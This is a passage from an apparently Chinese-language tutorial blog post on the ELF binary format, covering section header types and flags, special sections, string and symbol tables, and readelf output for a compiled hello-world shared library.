class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>SHT_NULL(0)</td><td>当前节是非活跃的，没有一个对应的具体的节内存</td></tr><tr><td>SHT_PROGBITS(1)</td><td>包含了程序的指令信息、数据等程序运行相关的信息</td></tr><tr><td>SHT_SYMTAB(2)</td><td>保存了符号信息，用于重定位。此种类型节的<code>sh_link</code>存储相关字符串表的节索引，<code>sh_info</code>存储最后一个局部符号的符号表索引+1</td></tr><tr><td>SHT_DYNSYM(11)</td><td>保存共享库导入动态符号信息。此种类型节的<code>sh_link</code>存储相关字符串表的节索引，<code>sh_info</code>存储最后一个局部符号的符号表索引+1</td></tr><tr><td>SHT_STRTAB(3)</td><td>一个字符串表，保存了每个节的节名称</td></tr><tr><td>SHT_RELA(4)</td><td>存储可重定位表项，可能会有附加内容，目标文件可能有多个可重定位表项。此种类型节的<code>sh_link</code>存储相关符号表的节索引，<code>sh_info</code>存储重定位所使用节的索引</td></tr><tr><td>SHT_HASH(5)</td><td>存储符号哈希表，所有参与动态链接的目标只能包含一个哈希表，一个目标文件只能包含一个哈希表。此种类型节的<code>sh_link</code>存储哈希表所使用的符号表的节索引,<code>sh_info</code>为0</td></tr><tr><td>SHT_DYAMIC(6)</td><td>存储包含动态链接的信息，一个目标文件只能包含一个。此种类型的节的<code>sh_link</code>存储当前节中使用到的字符串表格的节的索引，<code>sh_info</code>为0</td></tr><tr><td>SHT_NOTE(7)</td><td>存储以某种形式标记文件的信息</td></tr><tr><td>SHT_NOBITS(8)</td><td>这种类型的节不占据文件空间，但是成员<code>sh_offset</code>依然会包含对应的偏移</td></tr><tr><td>SHT_REL(9)</td><td>包含可重定位表项，无附加内容，目标文件可能有多个可重定位表项。此种类型节的<code>sh_link</code>存储相关符号表的节索引，<code>sh_info</code>存储重定位所使用节的索引</td></tr><tr><td>SHT_SHLIB(10)</td><td>保留区，包含此节的程序与ABI不兼容</td></tr><tr><td>[SHT_LOPROC(0x70000000), SHT_HIPROC(0x7fffffff)]</td><td>留给处理器专用语义</td></tr><tr><td>[SHT_LOUSER(0x80000000), SHT_HIUSER(0xffffffff)]</td><td>预留</td></tr></tbody></table></div><p><code>sh_flags</code>：1bit位的标志位。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>SHF_WRITE(0x1)</td><td>当前节包含进程执行过程中可写的数据</td></tr><tr><td>SHF_ALLOC(0x2)</td><td>当前节在运行阶段占据内存</td></tr><tr><td>SHF_EXECINSTR(0x4)</td><td>当前节包含可执行的机器指令</td></tr><tr><td>SHF_MASKPROC(0xf0000000)</td><td>所有包含当前掩码都表示预留给特定处理器的</td></tr></tbody></table></div><img src="/posts/187bfa35/3.3.1.png" class="" title="节头表"><h2 id="3-4-节"><a href="#3-4-节" class="headerlink" title="3.4 节"></a>3.4 节</h2><p>每个节区都有对应的节头来描述它。但是反过来，节区头部并不一定会对应着一个节区。</p><p>ELF文件中用一些预定义的节来保存程序、数据和一些控制信息，这些节被用来链接或者装载程序。每个操作系统都支持一组链接模式，主要分为两类（也就是常说的动态库和静态库）：</p><ul><li>Static：静态绑定的一组目标文件、系统库和库档案（比如静态库），解析包含的符号引用并创建一个完全自包含的可执行文件；</li><li>Dynamic：一组目标文件、库、系统共享资源和其他共享库链接在一起创建可执行文件。当加载此可执行文件时必须使系统中其他共享资源和动态库可用，程序才能正常运行。</li></ul><p>库文件无论是动态库还是静态库在其文件中都包含对应的节，一些特殊的节其功能如下：</p><p><code>.bss</code>，类型<code>SHT_NOBITS</code>，属性<code>SHF_ALLOC|SHF_WRITE</code>：存储未经初始化的数据。根据定义程序开始执行时，系统会将这些数据初始化为0，且此节不占用文件空间；</p><p><code>.comment</code>，类型<code>SHT_PROGBITS</code>，属性<code>none</code>：存储版本控制信息；</p><p><code>.data</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_WRITE</code>：存放初始化的数据；</p><p><code>.data1</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_WRITE</code>：存放初始化的数据；</p><p><code>.debug</code>，类型<code>SHT_PROGBITS</code>，属性<code>none</code>：存放用于符号调试的信息；</p><p><code>.dynamic</code>，类型<code>SHT_DYNAMIC</code>，属性<code>SHF_ALLOC</code>，是否有属性<code>SHF_WRITE</code>屈居于处理器：包含动态链接的信息，</p><p><code>.hash</code>，类型<code>SHT_HASH</code>，属性<code>SHF_ALLOC</code>：哈希符号表；</p><p><code>.line</code>，类型<code>SHT_PROGBITS</code>，属性<code>none</code>：存储调试的行号信息，描述源代码和机器码之间的对应关系；</p><p><code>.note</code>，类型<code>SHT_NOTE</code>，属性<code>none</code>：额外的编译器信息，比如程序的公司名、发布版本号等；</p><p><code>.rodata</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC</code>：存储只读数据；</p><p><code>.rodata1</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC</code>：存储只读数据；</p><p><code>.shstrtab</code>，类型<code>SHT_STRTAB</code>，属性<code>none</code>：存储节的名称；</p><p><code>.strtab</code>，类型<code>SHT_STRTAB</code>，属性<code>none</code>：存储常见的与符号表关联的字符串。如果文件有一个包含符号字符串表的可加载段，则该段的属性将包括<code>SHF_ALLOC</code>位； 否则，该位将关闭；</p><p><code>.symtab</code>，类型<code>SHT_SYMTAB</code>，属性<code>none</code>：存储一个符号表。如果文件具有包含符号表的可加载段，则该节的属性将包括<code>SHF_ALLOC</code>位；否则，该位将关闭；</p><p><code>.text</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_EXECINSTR</code>：存储程序的代码指令；</p><p><code>.dynstr</code>，类型<code>SHT_STRTAB</code>，属性<code>SHF_ALLOC</code>：存储动态链接所需的字符串，最常见的是表示与符号表条目关联的名称的字符串；</p><p><code>.dynsym</code>，类型<code>SHT_DYNSYM</code>，属性<code>SHF_ALLOC</code>：存储动态链接符号表；</p><p><code>.fini</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_EXECINSTR</code>：存储有助于进程终止代码的可执行指令。 当程序正常退出时，系统执行本节代码；</p><p><code>.init</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_EXECINSTR</code>：存储有助于进程初始化代码的可执行指令。 当程序开始运行时，系统会在调用主程序入口点（C 程序称为 main）之前执行本节中的代码；</p><p><code>.interp</code>，类型<code>SHT_PROGBITS</code>，<code>SHF_ALLOC</code>：保存程序解释器的路径名。 如果文件有一个包含该节的可加载段，则该节的属性将包括 <code>SHF_ALLOC</code> 位； 否则，该位将关闭；</p><p><code>.relname</code>，类型<code>SHT_REL</code>：包含重定位信息。如果文件具有包含重定位的可加载段，则这些部分的属性将包括 <code>SHF_ALLOC</code>位；否则，该位将关闭。通常，名称由 重定位适用的部分。因此<code>.text</code>的重定位部分通常具有名称<code>.rel.text</code>或<code>.rela.text</code>；</p><p><code>.relaname</code>，类型<code>SHT_RELA</code>：同relname。</p><p>其它：对于C++程序有些版本会有<code>.ctors</code>（有时也会是<code>.init_array</code>）和<code>.dtors</code>两个节存储构造和析构相关的代码。</p><h3 id="3-3-1-字符串表"><a href="#3-3-1-字符串表" class="headerlink" title="3.3.1 字符串表"></a>3.3.1 字符串表</h3><p>字符串表是一个存储字符串的表格，而每个字符串是以NULL也就是<code>\0</code>为结尾的。字符串表格中索引为0处的字符串被定义为空字符串。符号表中保存的字符串是节名和目标文件中使用到的符号。而需要使用对应字符串时，只需要在需要使用的地方指明对应字符在字符串表中的索引即可，使用的字符串就是索引处到第一个<code>\0</code>之间的字符串。</p><img src="/posts/187bfa35/3.4.1.png" class="" title="字符串表"><h3 id="3-3-2-符号表"><a href="#3-3-2-符号表" class="headerlink" title="3.3.2 符号表"></a>3.3.2 符号表</h3><p>目标文件的符号表包含定位和重定位程序的符号定义和引用所需的信息。符号表索引是该数组的下标。索引0既指定表中的第一个条目，又用作未定义的符号索引。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_sym</span>&#123;</span></span><br><span class="line">  Elf32_Wordst_name;<span class="comment">//存储一个指向字符串表的索引来表示对应符号的名称</span></span><br><span class="line">  Elf32_Addrst_value;<span class="comment">//存储对应符号的取值，具体值依赖于上下文，可能是一个指针地址，立即数等</span></span><br><span class="line">  Elf32_Wordst_size;<span class="comment">//符号的大小，具体指为sizeof(instance)，如果未知则为0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">//指定符号的类型和绑定属性</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_other;<span class="comment">//该成员当前持有 0 并且没有定义的含义</span></span><br><span class="line">  Elf32_Halfst_shndx;<span class="comment">//每个符号都有属于的节，当前成员存储的就是对应节的索引</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_sym</span> &#123;</span></span><br><span class="line">  Elf64_Word st_name;<span class="comment">/* Symbol name, index in string tbl */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">/* Type and binding attributes */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_other;<span class="comment">/* No defined meaning, 0 */</span></span><br><span class="line">  Elf64_Half st_shndx;<span class="comment">/* Associated section index */</span></span><br><span class="line">  Elf64_Addr st_value;<span class="comment">/* Value of the symbol */</span></span><br><span class="line">  Elf64_Xword st_size;<span class="comment">/* Associated symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>某些成员的相关参数：</p><p><code>st_value</code>：存储对应符号的取值，具体值依赖于上下文，可能是一个指针地址，立即数等。另外，不同对象文件类型的符号表条目对<code>st_value</code>成员的解释略有不同：</p><ul><li>在可重定位文件中，<code>st_value</code>保存节索引为<code>SHN_COMMON</code>的符号的对齐约束，<code>st_value</code>保存已定义符号的节偏移量。 也就是说，<code>st_value</code>是从<code>st_shndx</code>标识的部分的开头的偏移量。</li><li>在可执行文件和共享对象文件中，<code>st_value</code>保存一个虚拟地址。 为了使这些文件的符号对动态链接器更有用，节偏移（文件解释）让位于与节号无关的虚拟地址（内存解释）。</li></ul><p><code>st_info</code>：指定符号的类型和绑定属性。可以用下面的代码分别解析出<code>bind、type、info</code>三个属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_BIND(i) ((i)&gt;&gt;4) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_TYPE(i) ((i)&amp;0xf) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_INFO(b,t) (((b)&lt;&lt;4)+((t)&amp;0xf))</span></span><br></pre></td></tr></table></figure><ul><li>BIND：</li></ul><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>STB_LOCAL(0)</td><td>局部符号在包含其定义的目标文件之外是不可见的。 同名的本地符号可以存在于多个文件中，互不干扰</td></tr><tr><td>STB_GLOBAL(1)</td><td>全局符号对所有正在组合的目标文件都是可见的。 一个文件对全局符号的定义将满足另一个文件对同一全局符号的未定义引用</td></tr><tr><td>STB_WEAK(2)</td><td>弱符号类似于全局符号，但它们的定义具有较低的优先级</td></tr><tr><td>[STB_LOPROC(13), STB_HIPROC(15)]</td><td>预留位，用于特殊处理器的特定含义</td></tr></tbody></table></div><ul><li>TYPE：</li></ul><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>STT_NOTYPE(0)</td><td>符号的类型未指定</td></tr><tr><td>STT_OBJECT(1)</td><td>符号与数据对象相关联，例如变量、数组等</td></tr><tr><td>STT_FUNC(2)</td><td>符号与函数或其他可执行代码相关联</td></tr><tr><td>STT_SECTION(3)</td><td>该符号与一个节相关联。 这种类型的符号表条目主要用于重定位，通常具有<code>STB_LOCALBIND</code>属性</td></tr><tr><td>STT_FILE(4)</td><td>一个有<code>STB_LOCAL</code>的<code>BIND</code>属性的文件符号的节索引为<code>SHN_ABS</code>。并且如果存在其他<code>STB_LOCAL</code>属性的符号，则当前符号应该在其之前</td></tr><tr><td>[STT_LOPROC(13), STT_HIPROC(15)]</td><td>预留位，用于特殊处理器的特定含义</td></tr></tbody></table></div><ul><li>INFO：</li></ul><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>SHN_ABS</td><td>符号有一个绝对值，不会因为重定位而改变</td></tr><tr><td>SHN_COMMON</td><td>该符号标记尚未分配的公共块。 符号的值给出了对齐约束，类似于节的<code>sh_addralign</code>成员。 也就是说，链接编辑器将为符号分配存储空间，该地址是 <code>st_value</code>的倍数。 符号的大小表明需要多少字节</td></tr><tr><td>SHN_UNDEF</td><td>此节表索引表示该符号未定义。 当链接编辑器将此对象文件与另一个定义指定符号的文件组合时，此文件对符号的引用将链接到实际定义</td></tr></tbody></table></div><h1 id="4-ELF文件示例"><a href="#4-ELF文件示例" class="headerlink" title="4. ELF文件示例"></a>4. ELF文件示例</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上面的<code>hello.c</code>分别编译为三种不同文件：</p><ul><li><code>gcc -g -c hello.c</code>：生成可重定位文件<code>hello.o</code>。</li><li><code>gcc -g -o hello hello.c</code>：生成可执行文件。</li><li><code>gcc -g -fPIC -o libhello.so -shared hello.c</code>：生成共享目标文件。</li></ul><img src="/posts/187bfa35/4.1.1.png" class="" title="编译ELF文件"><h2 id="4-1-共享目标文件"><a href="#4-1-共享目标文件" class="headerlink" title="4.1 共享目标文件"></a>4.1 共享目标文件</h2><h3 id="4-1-1-ELF文件头"><a href="#4-1-1-ELF文件头" class="headerlink" title="4.1.1 ELF文件头"></a>4.1.1 ELF文件头</h3><p>解析ELF文件头：<code>readelf -h [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -h libhello.so </span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Shared object file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          14296 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         9</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         34</span><br><span class="line">  Section header string table index: 33                                  </span><br></pre></td></tr></table></figure><p>从上面的ELF文件头信息中能够看出：当前文件类型为64bit的共享库，小端存储，版本为1，机器架构为x86-64，程序头表项有9项，节头表项有34项。</p><h3 id="4-1-2-程序头表"><a href="#4-1-2-程序头表" class="headerlink" title="4.1.2 程序头表"></a>4.1.2 程序头表</h3><p>解析ELF程序头表：<code>readelf -l [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -l libhello.so</span><br><span class="line"></span><br><span class="line">Elf file type is DYN (Shared object file)</span><br><span class="line">Entry point 0x0</span><br><span class="line">There are 9 program headers, starting at offset 64</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000498 0x0000000000000498  R      0x1000</span><br><span class="line">  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000</span><br><span class="line">                 0x0000000000000139 0x0000000000000139  R E    0x1000</span><br><span class="line">  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000</span><br><span class="line">                 0x00000000000000b4 0x00000000000000b4  R      0x1000</span><br><span class="line">  LOAD           0x0000000000002e10 0x0000000000003e10 0x0000000000003e10</span><br><span class="line">                 0x0000000000000218 0x0000000000000220  RW     0x1000</span><br><span class="line">  DYNAMIC        0x0000000000002e20 0x0000000000003e20 0x0000000000003e20</span><br><span class="line">                 0x00000000000001c0 0x00000000000001c0  RW     0x8</span><br><span class="line">  NOTE           0x0000000000000238 0x0000000000000238 0x0000000000000238</span><br><span class="line">                 0x0000000000000024 0x0000000000000024  R      0x4</span><br><span class="line">  GNU_EH_FRAME   0x0000000000002010 0x0000000000002010 0x0000000000002010</span><br><span class="line">                 0x0000000000000024 0x0000000000000024  R      0x4</span><br><span class="line">  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000000 0x0000000000000000  RW     0x10</span><br><span class="line">  GNU_RELRO      0x0000000000002e10 0x0000000000003e10 0x0000000000003e10</span><br><span class="line">                 0x00000000000001f0 0x00000000000001f0  R      0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00     .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt </span><br><span class="line">   01     .init .plt .plt.got .text .fini </span><br><span class="line">   02     .rodata .eh_frame_hdr .eh_frame </span><br><span class="line">   03     .init_array .fini_array .dynamic .got .got.plt .data .bss </span><br><span class="line">   04     .dynamic </span><br><span class="line">   05     .note.gnu.build-id </span><br><span class="line">   06     .eh_frame_hdr </span><br><span class="line">   07     </span><br><span class="line">   08     .init_array .fini_array .dynamic .got </span><br></pre></td></tr></table></figure><p>从展示的程序头表可以看出上半部分的内容基本和程序头表项的每个字段基本对应。从下面的Segment Sections可以看出一个Segment是多个Section的集合。</p><h3 id="4-1-3-节头表"><a href="#4-1-3-节头表" class="headerlink" title="4.1.3 节头表"></a>4.1.3 节头表</h3><p>解析节头表：<code>readelf -S [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -S libhello.so</span><br><span class="line">There are 34 section headers, starting at offset 0x37d8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .note.gnu.bu[...] NOTE             0000000000000238  00000238</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 2] .gnu.hash         GNU_HASH         0000000000000260  00000260</span><br><span class="line">       0000000000000024  0000000000000000   A       3     0     8</span><br><span class="line">  [ 3] .dynsym           DYNSYM           0000000000000288  00000288</span><br><span class="line">       00000000000000a8  0000000000000018   A       4     1     8</span><br><span class="line">  [ 4] .dynstr           STRTAB           0000000000000330  00000330</span><br><span class="line">       0000000000000075  0000000000000000   A       0     0     1</span><br><span class="line">  [ 5] .gnu.version      VERSYM           00000000000003a6  000003a6</span><br><span class="line">       000000000000000e  0000000000000002   A       3     0     2</span><br><span class="line">  [ 6] .gnu.version_r    VERNEED          00000000000003b8  000003b8</span><br><span class="line">       0000000000000020  0000000000000000   A       4     1     8</span><br><span class="line">  [ 7] .rela.dyn         RELA             00000000000003d8  000003d8</span><br><span class="line">       00000000000000a8  0000000000000018   A       3     0     8</span><br><span class="line">  [ 8] .rela.plt         RELA             0000000000000480  00000480</span><br><span class="line">       0000000000000018  0000000000000018  AI       3    21     8</span><br><span class="line">  [ 9] .init             PROGBITS         0000000000001000  00001000</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [10] .plt              PROGBITS         0000000000001020  00001020</span><br><span class="line">       0000000000000020  0000000000000010  AX       0     0     16</span><br><span class="line">  [11] .plt.got          PROGBITS         0000000000001040  00001040</span><br><span class="line">       0000000000000008  0000000000000008  AX       0     0     8</span><br><span class="line">  [12] .text             PROGBITS         0000000000001050  00001050</span><br><span class="line">       00000000000000de  0000000000000000  AX       0     0     16</span><br><span class="line">  [13] .fini             PROGBITS         0000000000001130  00001130</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [14] .rodata           PROGBITS         0000000000002000  00002000</span><br><span class="line">       000000000000000d  0000000000000000   A       0     0     1</span><br><span class="line">  [15] .eh_frame_hdr     PROGBITS         0000000000002010  00002010</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [16] .eh_frame         PROGBITS         0000000000002038  00002038</span><br><span class="line">       000000000000007c  0000000000000000   A       0     0     8</span><br><span class="line">  [17] .init_array       INIT_ARRAY       0000000000003e10  00002e10</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [18] .fini_array       FINI_ARRAY       0000000000003e18  00002e18</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .dynamic          DYNAMIC          0000000000003e20  00002e20</span><br><span class="line">       00000000000001c0  0000000000000010  WA       4     0     8</span><br><span class="line">  [20] .got              PROGBITS         0000000000003fe0  00002fe0</span><br><span class="line">       0000000000000020  0000000000000008  WA       0     0     8</span><br><span class="line">  [21] .got.plt          PROGBITS         0000000000004000  00003000</span><br><span class="line">       0000000000000020  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .data             PROGBITS         0000000000004020  00003020</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [23] .bss              NOBITS           0000000000004028  00003028</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">  [24] .comment          PROGBITS         0000000000000000  00003028</span><br><span class="line">       000000000000001e  0000000000000001  MS       0     0     1</span><br><span class="line">  [25] .debug_aranges    PROGBITS         0000000000000000  00003046</span><br><span class="line">       0000000000000030  0000000000000000           0     0     1</span><br><span class="line">  [26] .debug_info       PROGBITS         0000000000000000  00003076</span><br><span class="line">       00000000000000b5  0000000000000000           0     0     1</span><br><span class="line">  [27] .debug_abbrev     PROGBITS         0000000000000000  0000312b</span><br><span class="line">       0000000000000064  0000000000000000           0     0     1</span><br><span class="line">  [28] .debug_line       PROGBITS         0000000000000000  0000318f</span><br><span class="line">       0000000000000052  0000000000000000           0     0     1</span><br><span class="line">  [29] .debug_str        PROGBITS         0000000000000000  000031e1</span><br><span class="line">       00000000000000a7  0000000000000001  MS       0     0     1</span><br><span class="line">  [30] .debug_line_str   PROGBITS         0000000000000000  00003288</span><br><span class="line">       000000000000001b  0000000000000001  MS       0     0     1</span><br><span class="line">  [31] .symtab           SYMTAB           0000000000000000  000032a8</span><br><span class="line">       0000000000000270  0000000000000018          32    20     8</span><br><span class="line">  [32] .strtab           STRTAB           0000000000000000  00003518</span><br><span class="line">       0000000000000178  0000000000000000           0     0     1</span><br><span class="line">  [33] .shstrtab         STRTAB           0000000000000000  00003690</span><br><span class="line">       0000000000000141  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure><p>从上面看出内容基本和程序头表项的每个字段基本对应。除了上面提到的特殊的节也有一些额外的节，比如<code>.got.plt</code>。</p><h3 id="4-1-4-符号表"><a href="#4-1-4-符号表" class="headerlink" title="4.1.4 符号表"></a>4.1.4 符号表</h3><p>解析符号表：<code>readelf -s [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span 